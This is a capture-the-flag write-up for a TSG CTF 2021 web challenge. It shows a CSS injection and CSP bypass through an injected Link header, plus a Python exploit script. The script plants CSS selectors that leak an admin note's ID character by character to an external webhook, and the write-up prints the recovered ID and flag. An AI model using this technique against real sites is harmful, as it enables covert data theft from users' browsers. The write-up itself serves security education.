My detailed writeup in Japanese is [here](https://blog.arkark.dev/2021/10/06/tsgctf/).

## Solution

- We can embed one HTTP header in any response from the service.
- CSP: `Content-Security-Policy: script-src 'self'; style-src 'self'; base-uri 'none'`

We can attack with CSS Injection and CSP Bypass using Link header as follows:

1. Create the following note:
    ```css
    {} * { background: black; }
    ```
2. Access to the following URL:
    ```javascript
    location = "http://34.84.69.72:8080/?k=Link&v=" + encodeURIComponent("<http://34.84.69.72:8080/notes/zibXjydLKQ?k=Content-Type&v=" + encodeURIComponent("text/css; charset=utf-8") + ">; rel=\"stylesheet\"")
    ```

Then, a browser imports the above CSS and displays the background in black. This attack only works in Firefox.

I wrote an exploit code:

```python
import httpx
from urllib.parse import quote

# base_url = "http://localhost:8080"
base_url = "http://34.84.69.72:8080"
base_ssrf_url = "http://app:8080"

hook_url = "https://webhook.site/xxx-xxx-xxx-xxx-xxx"

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

suffix = "R1cmOAtdG"
n = 1


def f(n: int):
    note_description = "{}\n"

    def rec(d: int, s: str) -> list[str]:
        if d == n:
            return [s]
        else:
            return sum([rec(d+1, s+c) for c in chars], [])

    for c in rec(0, ""):
        note_description += "li a[href$={{value}}] { background: url({{hook_url}}/{{value}}) }\n".replace("{{value}}", c + suffix).replace("{{hook_url}}", hook_url)

    res = httpx.post(
        base_url + "/notes",
        data={
            "title": "xxx",
            "description": note_description,
        },
        allow_redirects=False,
    )
    assert res.status_code == 302

    note_url = base_ssrf_url + res.headers["Location"]
    print(note_url)
    exploit_path = "/?k=Link&v=" + quote("<" + note_url + "?k=Content-Type&v=" + quote("text/css; charset=utf-8") + ">; rel=\"stylesheet\"")

    res = httpx.post(
        base_url + "/tell",
        data={
            "path": exploit_path,
        },
        allow_redirects=False,
    )
    assert res.status_code == 302


f(n)
```

I stole the ID of the admin's note by running this program several times.

The ID was `4R1cmOAtdG`. A flag was in `http://34.84.69.72:8080/notes/4R1cmOAtdG`.

## Flag

```
TSGCTF{uo_uo_uo_uo_uoooooooo_uo_no_gawa_love}
```
